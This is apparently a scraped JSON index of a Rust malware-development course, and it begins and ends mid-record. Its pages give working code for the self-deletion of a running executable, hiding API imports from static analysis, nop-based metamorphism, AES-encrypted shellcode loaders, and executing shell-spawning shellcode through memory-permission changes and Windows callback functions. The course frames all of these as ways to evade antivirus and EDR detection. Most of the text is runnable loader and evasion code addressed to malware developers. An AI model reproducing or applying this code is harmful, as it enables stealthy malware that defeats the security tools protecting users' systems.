part, it's going to be more complicated, as Windows prevents the deletion of a file while it's running.\nTo enable self-deletion on Windows, you'll need to take the following steps:\nOpen a HANDLE on the running process with DELETE access. \nRename the main file stream, :$DATA, to :whatyouwant.\nClose the HANDLE.\nOpen a HANDLE again on the running process with DELETE access, but this time set the DeleteFile flag of the FileDispositionInfo class to TRUE.\nClose the HANDLE to trigger file disposition.\nThe file is deleted.\nYou can't delete a mapped stream, but deleting a main stream also deletes the others, so that's what these steps are all about.\nHere's a list of all the libs you'll need:\n# src/windows/lib.rs\n//Libs needed :\nuse anyhow::{Ok, Result};\nuse std::ffi::c_void;\nuse std::iter::once;\nuse std::mem::size_of;\nuse std::os::windows::ffi::OsStrExt;\nuse std::ptr::copy;\nuse std::{env, ffi::OsStr};\nuse windows::{\n    core::PCWSTR,\n    Win32::{\n        Foundation::{CloseHandle, BOOLEAN, HANDLE},\n        Storage::FileSystem::{\n            CreateFileW, FileDispositionInfo, FileRenameInfo, SetFileInformationByHandle, DELETE,\n            FILE_ATTRIBUTE_NORMAL, FILE_DISPOSITION_INFO, FILE_RENAME_INFO, FILE_RENAME_INFO_0,\n            FILE_SHARE_NONE, OPEN_EXISTING,\n        },\n    },\n};\n\nSo we'll create in :\n# src/windows/lib.rs\n\nThe function :\ndisappear()\n\nThis makes :\n# src/windows/lib.rs\npub fn disappear() -&gt; Result&lt;()&gt; {\n    let placeholder = b\":legit___\";\n    if let Some(filename) = env::current_exe()?.to_str() { //get_filename\n        let mut handle = open(&amp;filename)?; //Step 1\n        rename(placeholder, handle); //Step 2\n        close(handle); //Step 3\n        handle = open(&amp;filename)?;\n        dispose(handle); //Step 4\n        close(handle); //Step 5\n    };\n    Ok(())\n}\n\nIn the above code, we start by initializing the placeholder that will be used to rename the main file stream. Next, we retrieve the absolute path of the executable as a String.\nAfter preparing the necessary variables, we'll create a :\nopen()\n\nThis will be used to open a HANDLE on the running process with DELETE access. \nTo do this, you can use the :\nCreateFileW\n\nIt is used to create, open or modify a file or device. It supports several operations, such as reading, writing and accessing specific attributes.\nHere's an example, to open a HANDLE on the running process with DELETE access:\n# src/windows/lib.rs\nfn open(path: &amp;str) -&gt; Result&lt;handle&gt; {\n    let os_path: Vec&lt;u16&gt; = OsStr::new(path).encode_wide().chain(once(0)).collect(); //Convert &amp;str to Vec&lt;u16&gt;\n    let handle = unsafe {\n        CreateFileW(\n            PCWSTR::from_raw(os_path.as_ptr()), \n            DELETE,\n            FILE_SHARE_NONE,\n            None,\n            OPEN_EXISTING,\n            FILE_ATTRIBUTE_NORMAL,\n            HANDLE::default(),\n        )\n    }?;\n    Ok(handle)\n}\n\nIn this function, we start by converting the path variable of type &amp;str'' to Vec&lt;u16&gt;, and then retrieve the raw vector pointer. And construct a raw PCWSTR pointer, for the lpfilename parameter of CreateFileW. Then we add the other necessary parameters to CreateFileW.\nOnce you've opened a HANDLE on the running process with DELETE access, you can perform step 2 by creating a :\nrename(placeholder, handle)\n\nThis will rename the main file stream, :$DATA, to :whatyouwant, here's an example of code to do this:\n# src/windows/lib.rs\nfn rename(placeholder: &amp;[u8; 9], handle: HANDLE) {\n    // Convert byte array `[u8; 9]` into 16-bit unsigned integer array `[u16; 9]`\n    let filename = placeholder.map(|b| b as u16);\n\n    // Calculate length of array `[u16; 9]` in bytes\n    let length = size_of::&lt;[u16; 9]&gt;();\n\n    // Initialize a FILE_RENAME_INFO structure with default values\n    let mut file_rename_info: FILE_RENAME_INFO = FILE_RENAME_INFO {\n        Anonymous: FILE_RENAME_INFO_0 {\n            ReplaceIfExists: BOOLEAN(0),\n        },\n        RootDirectory: HANDLE::default(),\n        FileNameLength: length as u32,\n        FileName: [0],\n    };\n\n    // Copy data from `filename` array to `FileName` field of `file_rename_info` structure\n    unsafe {\n        copy(\n            filename.as_ptr(),\n            file_rename_info.FileName.as_mut_ptr(),\n            length,\n        )\n    };\n\n    // Calculate the total buffer size required for SetFileInformationByHandle\n    let buffer_size = size_of::&lt;[u16; 9]&gt;() + size_of::&lt;FILE_RENAME_INFO&gt;();\n\n    // Call SetFileInformationByHandle to rename the file associated with the handle\n    let result = unsafe {\n        SetFileInformationByHandle(\n            handle,\n            FileRenameInfo,\n            &amp;file_rename_info as *const _ as *const c_void,\n            buffer_size as u32,\n        )\n    };\n\n    // Ignore the result of the call and create a Result containing the result\n    let _ = Ok(result);\n}\n\nFirst of all, when creating the function, be sure to adapt the placeholder type to the size of the placeholder variable created in the disappear function. \nSo this function basically changes the main file stream, :$DATA, to the placeholder. The placeholder variable must be converted so that it can be passed as a parameter with the correct type in the FILE_RENAME_INFO structure, and then added as a parameter in the SetFileInformationByHandle function. All this will rename the main file stream, :$DATA by the placeholder and return the result.\nWe can now move on to step 3 by closing the HANDLE, which is done very simply in Rust with this function for example:\n# src/windows/lib.rs\nfn close(handle: HANDLE) {\n    if Some(unsafe { CloseHandle(handle) }).is_some() {\n        let _ = Ok(());\n    }\n}\n\nSimply call the :\nCloseHandle()\n\nAnd add our previously used handle.\nWe can then directly reopen a HANDLE on the running process, with DELETE access afterwards, using the function :\nopen()\n\nwhich we created earlier. \nFor the last 2 steps, set the DeleteFile flag of the FileDispositionInfo class to TRUE and reuse the :\nclose()\n\nWe'll create a final function:\n# src/windows/lib.rs\nfn dispose(handle: HANDLE) {\n    let file_delete: FILE_DISPOSITION_INFO = FILE_DISPOSITION_INFO {\n        DeleteFile: BOOLEAN(1),\n    };\n    let result = unsafe {\n        SetFileInformationByHandle(\n            handle,\n            FileDispositionInfo,\n            &amp;file_delete as *const _ as *const c_void,\n            size_of::&lt;FILE_DISPOSITION_INFO&gt;() as u32,\n        )\n    };\n    let _ = Ok(result);\n}\n\nThis function takes as its parameter the handle created just before, then creates a variable that uses the Boolean DeleteFile set to 1, in the FILE_DISPOSITION_INFO structure. So that this variable can be set as a parameter in the function SetFileInformationHandle.\nReuse the :\nclose()\n\nto close this HANDLE.\nNow here's an example of our function:\ndisappear()\n\nIn file :\n.\n└── src\n    ├── main.rs\n\nThe file Cargo.toml :\n# Cargo.toml\n[package]\nname = \"my_houdini\"\nversion = \"0.1.0\nedition = \"2021\"\n\n[target.'cfg(target_os=\"windows\")'.dependencies]\nwindows = { version = \"0.46.0\", features = [\"Win32_Foundation\", \"Win32_Storage_FileSystem\", \"Win32_System_LibraryLoader\", \"Win32_Security\"] }\n\n[profile.release]\nopt-level = \"s\"\nstrip = true\nlto = true\npanic = \"abort\n\n[dependencies]\nanyhow = \"1.0.77\"\nwinapi = \"0.3.9\"\n\nThis Cargo.toml file contains all the configuration needed to use all the code seen above.\nThe main.rs file:\n# src/main.rs\n#[cfg(target_os = \"linux\")]\nmod linux;\n#[cfg(target_os = \"windows\")]\nmod windows;\n\n#[cfg(target_os = \"linux\")]\nuse crate::linux::disappear;\n#[cfg(target_os = \"windows\")]\nuse crate::windows::disappear;\n\nfn main() {\n    if let Err(e) = disappear() {\n        eprintln!(\"Error : {:?}\", e);\n    }\n}\n\nWe use the cfg tags to use the right mods and crates according to the operating system in use.\nThen all we have to do is call our disappear() function and display the error if it fails. If there's no error, our executable is deleted!\n\nAll the code seen in this course is provided in the following resource.\n","id":" https://nu11busters.github.io/rust-maldev-course/obfuscation/auto-remove/","title":"Self deletion"}," https://nu11busters.github.io/rust-maldev-course/obfuscation/dynamic-imports/":{"body":"The technique of dynamic module import, which is cross-platform for both Windows and Linux, involves dynamically loading external libraries at runtime. This way, we obfuscate the use of certain functionalities during static analysis.\nTo quickly understand how a static analyst reads our dynamic function calls, it is important to know that the functions we call are stored in specific places in our binaries:\n\nOn Windows, which uses the PE format, the called functions are stored in the IAT (Import Address Table), which is a data structure that contains the list of function addresses.\nOn Linux, which uses the ELF format, the called functions are stored in the GOT (Global Offset Table), which contains the list of function addresses from dynamic libraries.\n\nFor our example, we will reuse the shellcode loader we developed earlier in the course and obfuscate the call to the VirtualProtect function on Windows (the code is fully compatible with Linux to obfuscate the call to the mprotect function):\n.\n├── Cargo.lock\n├── Cargo.toml\n└── src\n    ├── main.rs\n    └── shellcode.bin\n\nuse libloading::{Library, Symbol};\nuse std::mem;\n\nconst SHELLCODE: &amp;[u8] = include_bytes!(\"shellcode.bin\");\n\nfn main() {\n    let map = Box::new(SHELLCODE);\n    let mut old_p = 0;\n\n    unsafe {\n        let lib = Library::new(\"kernel32.dll\").unwrap();\n        let virtual_protect = lib\n            .get::&lt;Symbol&lt;extern \"stdcall\" fn(*const (), usize, u32, *mut u32)&gt;&gt;(b\"VirtualProtect\")\n            .unwrap();\n\n        virtual_protect(map.as_ptr() as *mut (), map.len(), 32, &amp;mut old_p);\n\n        let exec_shellcode: extern \"C\" fn() -&gt; ! = mem::transmute(map.as_ptr());\n        exec_shellcode();\n    }\n}\n\nIn this implementation, we start by using the libloading dependency, which we have already used in a previous part of the course. It is a great wrapper around the Windows API because it uses the famous LoadLibraryA and GetProcAddress functions under the hood. (On Linux, it uses the dlopen and dlsym functions)\nNext, we load the \"kernel32.dll\" library into memory, which contains most of the Windows API functions, including the \"VirtualProtect\" function that we are interested in.\nNow, we find the address of our function by its name and apply its prototype extern \"stdcall\" fn(*const (), usize, u32, *mut u32), which we extracted from the official function documentation.

This technique is therefore much more effective at evading antivirus detection.\nIn concrete terms, metamorphism means altering the program's assembly instructions in a different way each time the binary is compiled, while achieving the same thing in the end.\nFor our example of metamorphism implementation, we're going to take advantage of the capabilities of Rust and its compiler, to develop a \"macro\" that will be applied to our functions to insert between each code instruction, a random number, between 1 and 10, of \"nop\" opcodes (an assembler instruction that performs no action\").\nA macro in Rust is similar to a macro in C: it's \"code\" executed during pre-compilation to reformat the code before it's compiled. In our case, we're going to develop what Rust calls a \"procedural\" macro, which is different from the \"declarative\" macros you may have seen with macro_rules!() and which we won't be looking at here.\nTo do this, we'll need to create two projects, one to develop the macro in a separate library, and one to demonstrate the use of the macro:\nmeta_bin/\n├── Cargo.lock\n├── Cargo.toml\n└── src\n └── main.rs\nmeta_lib/\n├── Cargo.lock\n├── Cargo.toml\n└── src\n └── lib.rs\n\nWe'll start with the macro code, first with this configuration in the \"Cargo.toml\" file:\n# meta_lib/Cargo.toml\n\n...\n[lib]\nproc-macro = true\n\n[dependencies]\nsyn = {version = \"2.0.45\", features = [\"full\"]}\nquote = \"1.0.34\"\nproc-macro2 = \"1.0.73\"\nrand = \"0.8\"\n\nThe syn, quote and proc-macro2 dependencies are required to write a procedural macro, and rand to implement random functionality.\nThen the macro source code:\n# meta_lib/src/lib.rs\n\nuse proc_macro::TokenStream;\nuse quote::quote;\nuse rand::Rng;\nuse syn::{parse_macro_input, ItemFn};\n\n#[proc_macro_attribute]\npub fn nopper(_: TokenStream, input: TokenStream) -&gt; TokenStream {\n    let input = parse_macro_input!(input as ItemFn);\n\n    let fn_name = &amp;input.sig.ident;\n    let block = &amp;input.block;\n\n    let mut modified_statements = quote! {};\n    for stmt in &amp;block.stmts {\n        let num = rand::thread_rng().gen_range(1..10);\n        let mut nops = quote! {};\n        for _ in 0..=num {\n            nops = quote! {\n                #nops\n                core::arch::asm!(\"nop\");\n            }\n        }\n\n        modified_statements = quote! {\n            #modified_statements\n            #stmt\n            unsafe {\n                #nops\n            };\n        };\n    }\n\n    quote! {\n        fn #fn_name() {\n            #modified_statements\n        }\n    }\n    .into()\n}\n\nOur nopper function is defined as an attribute macro via proc_macro_attribute. It takes as argument input, which corresponds to the content of our function.\nWe will then iterate over each statement of our function (called stmt for statement), for which we will :\nretrieve a random number from 1 and 10\nFor this number of times, instantiate the \"core::arch::asm!('nop');\" instruction, which will write our opcode.\nThen, we rewrite the function with our modified instructions.\nWe'll now move on to the code that will use our macro:\n# meta_bin/src/main.rs\n\nuse meta_lib::nopper;\n\n#[nopper]\nfn main() {\n    println!(\"Print1\");\n    println!(\"Print2\");\n}\n\nAnd now our main function will contain a nop opcode between each println, so there should be two blocks.\nTo demonstrate the difference with and without our macro, here are the assembly instructions:\nWithout :\n\nwith :\n\nWe're back to our two \"nop\" blocks.\nConclusion🔗\nThis implementation of metamorphism is rather basic, but provides you with a solid foundation for macro development in Rust.\nIt's up to you to use your creativity to push this technique further.\n","id":" https://nu11busters.github.io/rust-maldev-course/obfuscation/metamorphism/","title":"Metamorphism"}," https://nu11busters.github.io/rust-maldev-course/obfuscation/polymorphism/":{"body":"Polymorphic malware consists of a binary that constantly changes its content, while retaining the same functionality.

Next, we fill in the dependencies of our program, and finally, we fill in the dependencies used only in the context of the \"build script\".\nAs the build.rs file is the Rust script that will be executed during pre-compilation, here are its contents:\nuse libaes::Cipher;\nuse rand::RngCore;\nuse std::fs;\n\nfn main() {\n    let src_path = \"shellcode.bin\";\n    let dst_path = \"src/binaries/encrypted_shellcode.bin\";\n    let key_path = \"src/binaries/key.bin\";\n    let iv_path = \"src/binaries/iv.bin\";\n\n    let mut key = [0u8; 32];\n    let mut iv = [0u8; 32];\n\n    rand::thread_rng().fill_bytes(&amp;mut key);\n    rand::thread_rng().fill_bytes(&amp;mut iv);\n\n    let cipher = Cipher::new_256(&amp;key);\n\n    let encrypted = cipher.cbc_encrypt(&amp;iv, &amp;fs::read(src_path).unwrap());\n    fs::write(dst_path, encrypted).unwrap();\n    fs::write(key_path, key).unwrap();\n    fs::write(iv_path, iv).unwrap();\n}\n\nIn this script, we start by defining the paths to the files we're going to use, including the original shellcode whose contents we're going to retrieve, and then the location of the encrypted shellcode as well as the key and IV that go with it, in the project's source code.\nWe then initialize two buffers, one for the key and one for the IV, which we'll fill with random characters.\nWe now have what we need to encrypt our shellcode and store everything in its proper place so that it can be loaded by our program.\nExecuting the shellcode🔗\nWe'll now describe how to load the previously generated files into our program and then decrypt and call shellcode at runtime:\nuse libaes::Cipher;\nuse libc::mmap;\nuse libc::{mprotect, MAP_ANON, MAP_PRIVATE, PROT_EXEC, PROT_READ, PROT_WRITE};\nuse std::{mem, ptr};\n\nstatic SHELLCODE: &amp;[u8] = include_bytes!(\"binaries/encrypted_shellcode.bin\");\nstatic KEY: &amp;[u8; 32] = include_bytes!(\"binaries/key.bin\");\nstatic IV: &amp;[u8; 32] = include_bytes!(\"binaries/iv.bin\");\n\nfn main() {\n    let cipher = Cipher::new_256(KEY);\n    let decrypted = cipher.cbc_decrypt(IV, SHELLCODE);\n\n    unsafe {\n        let map = mmap(\n            ptr::null_mut(),\n            4096,\n            PROT_READ | PROT_WRITE,\n            MAP_PRIVATE | MAP_ANON,\n            -1,\n            0,\n        );\n\n        ptr::copy(decrypted.as_ptr(), map as *mut u8, decrypted.len());\n\n        mprotect(map, 4096, PROT_READ | PROT_EXEC);\n\n        let exec_shellcode: extern \"C\" fn() -&gt; ! = mem::transmute(map);\n        exec_shellcode();\n    }\n}\n\nHere, we start by loading the contents of the encrypted shellcode, the key and the IV into their respective static variables at compile time.\nWe then proceed to decrypt the shellcode in memory.

Understand the structure of an assembler instruction, registers, memory, etc.\nCalling assembler in Rust🔗\nAssembler is a low-level language that represents the instructions directly executed by a computer's processor. Each instruction generally corresponds to a specific hardware operation.\nThe benefits of assembler with Rust🔗\nWriting assembler code in Rust is interesting for a number of reasons. First of all, for development purposes, there's great interest, as you can manipulate low-level instructions while taking advantage of Rust's modern features. Rust's clear, expressive syntax simplifies the writing of assembler instructions, making it more accessible even to those who are not assembler experts. But also, shellcodes can be written in a more structured way, improving code maintenance over time. Of course, there are many other advantages to using Rust for assembler, depending on your needs. To summarize, assembler in Rust offers a balanced approach to leveraging the power of assembler while mitigating the challenges associated with using it directly.\nHow to call assembler in Rust?🔗\nTo illustrate my point, let's take the following assembler code as an example:\nsection .data\n   message db 'Hello world!', 0\n   len equ $ - message\n\nsection .text\n   global _start\n\n_start:\n\n   ; Load syscall number sys_write (1) into rax\n   mov rax, 1\n\n   ; Load file descriptor for stdout (1) into rdi\n   mov rdi, 1\n\n   lea rsi, [message]\n   mov rdx, len\n\n   ; System call sys_write\n   syscall\n\n   ; End of program - Load sys_exit syscall number (60) into rax\n   mov rax, 60\n\n   Load output code 0 into rdi\n   xor rdi, rdi\n\n   ; System call sys_exit\n   syscall\n\nThis code displays :\nHello world!\nIn the console, type the command :\nnasm -f elf64 hello.asm -o hello.o &amp;&amp; ld hello.o -o hello &amp;&amp; ./hello\nNext, you'll need to change the Rust compiler version from stable to nightly. Because the :\nasm!\nis currently experimental and requires the nightly version of the Rust compiler. To do this, simply take the Optimizing Cargo course.\nHere's an example of how to configure Cargo.toml:\n[package] name = \"hello\nversion = \"0.1.0\nedition = \"2021\"\n\n[dependencies]\n\n[profile.release]\nopt-level = \"s\"\nstrip = true\nlto = true\npanic = \"abort\n\nNow we can move on to the main part of this course, calling assembler in Rust. We're going to take the assembler code we saw earlier and integrate it into our Rust code. Here's the basis of our program:\nuse std::arch::asm;\n\nfn main() {\n   //Declaration of the string to be displayed in the console\n   let message = String::from(\"Hello world!\\n\");\n   unsafe {\n      asm!(\n         //Your assembler code will be here\n      )\n   }\n}\n\nIn Rust, arguments can be called up in a different order than in assembler. In our case, the arrangement of arguments for a system call is :\nsyscall\nmay vary according to the system API convention used. In the case of the Linux x86-64 system API, the arguments for syscall :\nwrite\nare generally passed in the rdi, rsi, rdx, r10, r8 and r9 registers, in that order.\nIn our assembly code, the order of the arguments conforms to this convention:\nLoad syscall number sys_write (1) into rax\nmov rax, 1\n; Load file descriptor for stdout (1) into rdi\nmov rdi, 1\n; Load message pointer into rsi\nlea rsi, [message]\n; Load message length into rdx\nmov rdx, len\n; System call sys_write\nsyscall\n\nIn assembly code, loading the pointer to the message :\nlea rsi, [message]\nAnd the length of the message:\nmov rdx, len\nPerformed before the system call\nsyscall\nIn accordance with Linux x86-64 convention.\nHowever, the situation is different in Rust code. In the case of the :\nasm!\nConstraints:\nin\nSpecify operands that are inputs to the assembly instruction, but this does not necessarily determine the order of evaluation. In your Rust code, in constraints are specified after syscall:\nasm!(\n   \"mov rax, 1\",\n   \"mov rdi, 1\",\n   \"syscall\",\n   in(\"rsi\") message.as_ptr(),\n   in(\"rdx\") message.len(),\n)\n\nThe evaluation order can change depending on the compiler and the optimizations performed. This can sometimes lead to a change in the apparent order of in constraints compared to assembly code. If we take a closer look :\n\"mov rax, 1\"\nThis instruction loads the syscall number into rax.\n\"mov rdi, 1\"\nThis instruction loads the stdout file descriptor into rdi.\n\"syscall\"\nThis instruction performs the syscall write. At this point, the values in rsi and rdx will be used as parameters for syscall.\nin(\"rsi\") message.as_ptr()\nThis constraint specifies that rsi is an input and loads the address of the beginning of the message.as_ptr() string into rsi. This is important because rsi is an input register for syscall.\nin(\"rdx\") message.len()\nThis constraint specifies that rdx is an input and loads the length of the message.len() string into rdx. It's also crucial because rdx is used as an input parameter for syscall.\nHowever, as long as the constraints are correctly specified and the values are correctly loaded into the registers before syscall, the result should be correct. It's important to note that specifying in constraints after syscall in Rust code doesn't affect the actual order in which operations are evaluated, and the compiler will ensure that the necessary values are correctly loaded before the system call.\nSo here's our final program:\nuse std::arch::asm;\n\nfn main() {\n   let message = String::from(\"Hello world!\\n\");\n   unsafe {\n      asm!(\n         \"mov rax, 1\",\n         \"mov rdi, 1\",\n         \"syscall\",\n         in(\"rsi\") message.as_ptr(),\n         in(\"rdx\") message.len(),\n      )\n   }\n}\n\nFinally, we can see that calling assembler in Rust is pretty easy. You just need to pay attention to the evaluation order and the conventions of the system APIs. To play with variables, use the various operands available in Rust:\nin, out, inout, inlateout, lateout, etc.\nThe in operand is used to specify that the values of the specified registers will be read by the assembler instruction. This means that the register values will be used as input for the assembler instruction.\nExample:\nasm!(\"mov $0, $1\" : \"=r\"(output) : \"r\"(input));\nThe out operand is used to specify that the specified register values will be written by the assembler instruction. This means that the register values will be modified by the assembler instruction and returned as output.\nExample :\nasm!(\"mov $0, $1\" : \"=r\"(output) : \"r\"(input));\nThe inout operand combines in and out. It specifies that the values of specified registers will be read as input and written as output by the assembler instruction.\nExample:\nasm!(\"add $0, $1\" : \"=r\"(result) : \"r\"(value));\nThe inlateout operand is similar to inout, but indicates that the write operation (out) can be delayed until the end of the asm! block.\nExample:\nasm!(\"add $0, $1\" : \"=&amp;r\"(result) : \"r\"(value));\nThe lateout operand is used to specify that the write operation (out) can be delayed until the end of the asm! block, without any initial read operation.\nExample:\nasm!(\"mov $0, $1\" : \"=&amp;r\"(output));\nIn these examples, $0, $1, etc. are substitution operands used to reference the register values specified in the operand list. The symbols \"=r\" and \"r\" define the type and access mode of the registers.\nAll the code seen in this course is available as a file on the following page.\n","id":" https://nu11busters.github.io/rust-maldev-course/shellcode/call-assembly-in-rust/","title":"Call assembly in Rust"}," https://nu11busters.github.io/rust-maldev-course/shellcode/exec-shellcode-in-local/":{"body":"Local shellcode execution🔗\nLocal shellcode execution, where the term \"shellcode\" refers to a small piece of independent code, in the form of an opcode suite, specifically designed to be injected and executed in the memory of a running process. Unlike traditional software, which is designed to perform specific tasks, shellcode is used for malicious purposes, exploiting a system's vulnerabilities to gain unauthorized access or control.\nThe term \"local\" in local shellcode execution means that the code is intended to run on the same process itself, as opposed to remote execution where an attacker can deploy the code on another process, also known as code injection and which we'll see in the \"Evasion\" part of the course. Local shellcode execution involves exploiting the capabilities provided by the operating system, enabling an attacker to inject his own code directly into the process's memory space.\nSo, for us malware developers, shellcode execution in our programs can help us to trick security solutions and hide malicious code. This type of shellcode-executing program is called a \"loader\". To do this, we need two things: firstly, a shellcode PIC (for \"Position Independent Code\") to execute, of course, and secondly, a region of memory with read, write and, above all, execute permissions.\nIn this part of the course, we'll look at the different techniques for executing shellcode.\nWe'll use the following shellcodes as examples:\n\nLinux, which will execute a \"/bin/sh\" shell:\n\necho '6a6848b82f62696e2f2f2f73504889e7687269010181342401010131f6566a085e4801e6564889e631d26a3b580f05' | xxd -r -p &gt; shellcode_linux.bin\n\n\nWindows, which will execute a \"cmd.exe\" shell:\n\n$ echo '6a6848b82f62696e2f2f2f73504889e768726901018134240101010131f6566a085e4801e6564889e631d26a3b580f0589c24801da4531c941b1884c01ca448b024901d8418b70204801de4831c949b947657450726f634148ffc18b048e4801d84c390875f2418b70244801de668b0c4e418b701c4801de8b048e4801d84889c748b801010101010101015048b856686f4479646201483104244889e231f665488b4e60488b4918488b712048ad489648ad488b48204883ec30ffd74883c4384889c648b801010101010101015048b8626c652f64796401483104244889e14883ec30ffd64883c438ebfe' | xxd - r -p &gt; shellcode_windows. bin\n\nRun in \".text\" section🔗\nThe \".text\" section is already executable by default, as this is the section that contains your binary code. This seems an appropriate place to execute shellcode, so let's see how we can place and execute shellcode in this section.\nHere's the code structure:\n.\n├── Cargo.lock\n├── Cargo.toml\n└── src\n ├── main.rs\n ├── shellcode_linux.bin\n └── shellcode_windows.bin\n\nSource:\n# src/main.rs\n\nuse std::mem;\n\n#[no_mangle]\n#[link_section = \".text\"]\n#[cfg(target_os = \"linux\")]\nstatic SHELLCODE: [u8; 48] = *include_bytes!(\"shellcode_linux.bin\");\n\n#[no_mangle]\n#[link_section = \".text\"]\n#[cfg(target_os = \"windows\")]\nstatic SHELLCODE: [u8; 217] = *include_bytes!(\"shellcode_windows.bin\");\n\nfn main() {\n    let exec_shellcode: extern \"C\" fn() -&gt; ! =\n        unsafe { mem::transmute(&amp;SHELLCODE as *const _ as *const ()) };\n    exec_shellcode();\n}\n\nWe can see here that we're using the \"#[link_section = \".text\"]\" macro to insert our shellcode directly into the \".text\" section of our binary.\nWe then retrieve the shellcode address from memory and convert it into a function pointer that we can call.\nHere's how it works on Linux and Windows:\n\n\nThe good thing about this technique is that it's simple, cross-platform and requires no use of the operating system.\nThe \".text\" section is not writable, so we can't use any encoder to obfuscate our shellcode. Malicious code will therefore be quickly detected by security solutions.\nExecution in a dynamic allocation🔗\nExecuting shellcodes in dynamic allocations consists in allocating a block of memory with execution rights on the heap of our process, copying our shellcode into it, then directly calling this block of memory as if it were the code of a function.\nThis little trick requires calls to the operating system's APIs, so we'll divide this technique into two for Linux and Windows.\nLinux🔗\nTo execute shellcode in a dynamic allocation on Linux, we're going to use the \"libc\" module, which will enable us to interact directly with the \"mprotect\" system call, which will enable us to modify the permissions of a memory allocation that we're going to create using a simple instance of Rust's \"Box\". The aim here is to add the right to execute, which is not present by default.\nWe'll then retrieve the address of this allocation and convert it into a function pointer that we'll call.\n.\n├── Cargo.lock\n├── Cargo.toml\n└── src\n ├── main.rs\n └── shellcode.bin\n\n# src/main.rs\n\nuse libc::{mprotect, PROT_EXEC, PROT_READ};\nuse std::{ffi::c_void, mem};\n\nconst SHELLCODE: &amp;[u8] = include_bytes!(\"shellcode.bin\");\n\nfn main() {\n    let map = Box::new(SHELLCODE);\n\n    unsafe {\n        mprotect(\n            map.as_ptr() as *mut c_void,\n            map.len(),\n            PROT_READ | PROT_EXEC,\n        );\n\n        let exec_shellcode: extern \"C\" fn() -&gt; ! = mem::transmute(map.as_ptr());\n        exec_shellcode();\n    }\n}\n\nUnfortunately, we'll be using \"unsafe\" code here, as we'll be using a C-interfaced function for the \"mprotect\" system call, as well as direct manipulation of our Box pointer.\nWindows🔗\nTo execute shellcode in a dynamic allocation on Windows, we'll use exactly the same technique as on Linux.\nWe're going to use the \"windows\" module, which will enable us to interact directly with the \"VirtualProtect\" function, which fulfills the same mission as the \"mprotect\" system call on Linux, allowing us to modify the permissions of a memory allocation we're going to make using a simple instance of Rust's \"Box\". The aim here is the same: to add the right to execute, which is not present by default.\n.\n├── Cargo.lock\n├── Cargo.toml\n└── src\n ├── main.rs\n └── shellcode.bin\n\n# src/main.rs\n\nuse std::{ffi::c_void, mem};\nuse windows::Win32::System::Memory::{VirtualProtect, PAGE_EXECUTE_READ, PAGE_PROTECTION_FLAGS};\n\nconst SHELLCODE: &amp;[u8] = include_bytes!(\"shellcode.bin\");\n\nfn main() {\n    let map = Box::new(SHELLCODE);\n    let mut old_p = PAGE_PROTECTION_FLAGS::default();\n\n    unsafe {\n        VirtualProtect(\n            map.as_ptr() as *mut c_void,\n            map.len(),\n            PAGE_EXECUTE_READ,\n            &amp;mut old_p,\n        )\n        .unwrap();\n\n        let exec_shellcode: extern \"C\" fn() -&gt; ! = mem::transmute(map.as_ptr());\n        exec_shellcode();\n    }\n}\n\nWe have to use an \"unsafe\" block here too, for the same reasons as in the Linux example.\nThis technique is more interesting than most versions found on other resources, because firstly, we go through Rust's memory allocator instead of doing our own allocation, which is less suspicious. Secondly, at no point do we create a section with RWX permissions (read, write and execute), which is also very suspicious.\nExecution via callback function\nThe technique we're now going to use is a very interesting one for obfuscating the execution of our shellcode.\nIn the Windows API, there are functions that take a \"callback\" as argument, which are used to supply code managed by our program to an external dynamic library that we don't control.\nAn explanatory diagram by Microsoft summarizes how this works:\n\nThe technique we're going to use consists in giving the function pointer of our shellcode as a callback function, which will then be executed in a new thread.\nHere's a list, as exhaustive as possible according to our research, of the Windows API callback functions in question:\n\nCertEnumSystemStore\nCertEnumSystemStoreLocation\nCopyFile2\nCopyFileEx\nCreateThreadPoolWait\nCreateTimerQueueTimer_Tech\nCryptEnumOIDInfo\nEnumCalendarInfo\nEnumCalendarInfoEx\nEnumChildWindows\nEnumDateFormatsA\nEnumDesktopsW\nEnumDesktopW\nEnumDesktopWindows\nEnumDirTreeW\nEnumDisplayMonitors\nEnumFontFamiliesExW\nEnumFontFamiliesW\nEnumFontsW\nEnumICMProfiles\nEnumLanguageGroupLocalesW\nEnumObjects\nEnumPageFilesW\nEnumPropsEx\nEnumPropsW\nEnumPwrSchemes\nEnumResourceTypesExW\nEnumResourceTypesW\nEnumSystemCodePagesA\nEnumSystemCodePagesW\nEnumSystemGeoID\nEnumSystemLanguageGroupsA\nEnumSystemLocales\nEnumThreadWindows\nEnumTimeFormatsA\nEnumTimeFormatsEx\nEnumUILanguagesA\nEnumUILanguagesW\nEnumWindowStationsW\nEnumWindows\nEnumerateLoadedModules\nFiberContextEdit\nFlsAlloc\nImageGetDigestStream\nImmEnumInputContext\nInitOnceExecuteOnce\nLdrEnumerateLoadedModules\nLdrpCallInitRoutine\nOpenThreadWaitChainSession\nRtlUserFiberStart\nSetTimer\nSetupCommitFileQueueW\nSymEnumProcesses\nSymFindFileInPath\nSysEnumSourceFiles\nVerifierEnumerateResource\n\nYou're free to study the Microsoft documentation for the function you want to use.\nOr you can consult this Github repository, which contains sample implementations of some of these callback functions: https://github.com/aahmad097/AlternativeShellcodeExec .\nWe'll now develop an example with the \"EnumSystemGeoID\" function, based on our previous implementation of dynamic allocation:\n# src/main.rs\n\nuse std::ffi::c_void;\nuse std::mem::transmute;\nuse windows::Win32::Globalization::{EnumSystemGeoID, GEO_ENUMPROC};\nuse windows::Win32::System::Memory::{VirtualProtect, PAGE_EXECUTE_READ, PAGE_PROTECTION_FLAGS};\n\nconst SHELLCODE: &amp;[u8] = include_bytes!(\"shellcode.bin\");\n\nfn main() {\n    let map = Box::new(SHELLCODE);\n    let mut old_p = PAGE_PROTECTION_FLAGS::default();\n\n    unsafe {\n        VirtualProtect(\n            map.as_ptr() as *mut c_void,\n            map.len(),\n            PAGE_EXECUTE_READ,\n            &amp;mut old_p,\n        )\n        .unwrap();\n\n        let res = EnumSystemGeoID(\n            16,\n            0,\n            transmute::&lt;*mut std::ffi::c_void, GEO_ENUMPROC&gt;(map.as_ptr() as *mut c_void),\n        );\n    }\n}\n\nWith this technique, we can execute code much more unobtrusively, as these Windows API functions are rarely monitored by security solutions.\nConclusion\nYou now have all the tools you need to execute shellcode on your own processes. This will come in handy when you want to obfuscate pieces of code and escape static analysis by antivirus software.\nAs we'll see later on, this type of behavior is easily detected by EDR-based security solutions, which is why we'll be looking at how to evade detection in another part of this course.\n","id":" https://nu11busters.github.io/rust-maldev-course/shellcode/exec-shellcode-in-local/","title":"Execute shellcode in local process"}," 